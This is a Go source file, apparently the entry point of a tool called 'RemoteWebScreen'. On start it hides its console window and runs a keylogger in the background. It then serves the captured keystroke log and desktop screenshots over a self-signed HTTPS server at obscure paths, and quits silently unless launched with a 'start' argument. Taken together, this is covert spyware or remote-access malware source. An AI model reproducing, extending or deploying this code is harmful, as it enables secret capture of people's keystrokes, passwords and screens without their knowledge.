package main

import (
	"RemoteWebScreen/keyboard"
	"RemoteWebScreen/server"
	"RemoteWebScreen/win32"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509/pkix"
	"strconv"
	"strings"

	//"crypto/tls"
	"crypto/x509"
	"embed"
	"encoding/pem"
	"fmt"
	"html/template"
	"io/ioutil"
	"math/big"
	//"net"
	"net/http"
	"os"
	"path/filepath"
	"time"
)

//go:embed  index.html static/*
var templates embed.FS

func init() {
	win32.HideConsole()
}

func Initgenalkey() {
	//cert auto gen
	//key, err := rsa.GenerateKey(rand.Reader, 4096)
	//if err != nil {
	//	panic(err)
	//}
	//template := x509.Certificate{SerialNumber: big.NewInt(1)}
	//certDER, err := x509.CreateCertificate(
	//	rand.Reader,
	//	&template,
	//	&template,
	//	&key.PublicKey,
	//	key)
	//if err != nil {
	//	panic(err)
	//}
	//keyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(key)})
	//certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	//
	//if err := os.WriteFile("certs/server.pem", certPEM, os.ModePerm); err != nil {
	//	panic(err)
	//}
	//if err := os.WriteFile("certs/server.key", keyPEM, os.ModePerm); err != nil {
	//	panic(err)
	//}
	_, err := os.Stat("certs")
	if os.IsNotExist(err) {
		errDir := os.MkdirAll("certs", 0755)
		if errDir != nil {
			//log.Fatal(err)
		}
	}
	priv, _ := rsa.GenerateKey(rand.Reader, 2048)

	notBefore := time.Now()
	notAfter := notBefore.Add(365 * 24 * time.Hour)

	template := x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			Organization: []string{"Acme Co"},
		},
		NotBefore: notBefore,
		NotAfter:  notAfter,

		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	derBytes, _ := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)

	certOut, _ := os.Create("certs/server.pem")
	defer certOut.Close()

	pem.Encode(certOut, &pem.Block{Type: "CERTIFICATE", Bytes: derBytes})

	keyOut, _ := os.OpenFile("certs/server.key", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
	defer keyOut.Close()

	pem.Encode(keyOut, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(priv)})

}

func main() {
	listenAddress := ":443"
	if len(os.Args) == 1 {
		os.Exit(0)
	} else if len(os.Args) == 2 && os.Args[1] == "start" {
	} else if len(os.Args) == 3 && os.Args[1] == "start" {
		listenAddress = fmt.Sprintf(":%s", os.Args[2])
	} else {
		os.Exit(0)
	}
	port, err  := strconv.Atoi(strings.TrimPrefix(listenAddress, ":"))
	if err != nil {
	}
	Initgenalkey()
	//tlsConfig := &tls.Config{}
	//cert, err := tls.LoadX509KeyPair("certs/server.pem", "certs/server.key")
	//if err != nil {
	//	return
	//}
	//tlsConfig.Certificates = []tls.Certificate{cert}
	//SimulateDesktopConfig := &tls.Config{
		//Certificates: []tls.Certificate{cert},
	//}
	//SimulateDesktopListener, err := tls.Listen("tcp", ":0", tlsConfig)
	//if err != nil {
	//	//log.Printf("Failed to listen on a random port: %v", err)
	//}
	//httpsListener, err := tls.Listen("tcp", listenAddress, tlsConfig)
	//if err != nil {
	//	//log.Fatalf("Failed to create TLS listener: %v", err)
	//}
	//SimulateDesktopwsPort := SimulateDesktopListener.Addr().(*net.TCPAddr).Port
	go keyboard.Keylog()
	http.HandleFunc("/"+listenAddress, func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		contentBytes, err := templates.ReadFile("index.html")
		if err != nil {
			//log.Printf("contentBytes, err := templates.ReadFile(index.html): %v", err)
		}
		tmpl, err := template.New("index").Parse(string(contentBytes))
		if err != nil {
			//log.Printf("tmpl, err := template.New(index).Parse(string(contentBytes)): %v", err)
		}
		tmpl.Execute(w, map[string]interface{}{
			"WebSocketPort": port,
		})
	})
	fs := http.FS(templates)
	http.Handle("/static/", http.StripPrefix("/", http.FileServer(fs)))
	http.HandleFunc("/"+listenAddress+"log", func(w http.ResponseWriter, r *http.Request) {
		filePath := filepath.Join(keyboard.Screen_logPath, keyboard.Logfilename)
		content, err := ioutil.ReadFile(filePath)
		if err != nil {
			//log.Printf("httplog: %v", err)
			//return
		}
		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
		w.WriteHeader(http.StatusOK)
		w.Write(content)
	})
	go func() {
		if err := http.ListenAndServeTLS(listenAddress, "certs/server.pem", "certs/server.key", nil); err != nil {
			//log.Fatalf("Failed to start HTTPS server: %v", err)
		}
	}()
	go func() {
		http.HandleFunc("/SimulateDesktop", server.ScreenshotHandler)

	}()
	//if err := http.ListenAndServeTLS(":0", "certs/server.pem", "certs/server.key", nil); err != nil {
	//	//log.Printf("Failed to start WebSocket server: %v", err)
	//}
	//go func() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	for {
		<-ticker.C
		server.CleanupConnections()
	}
	//}()
}
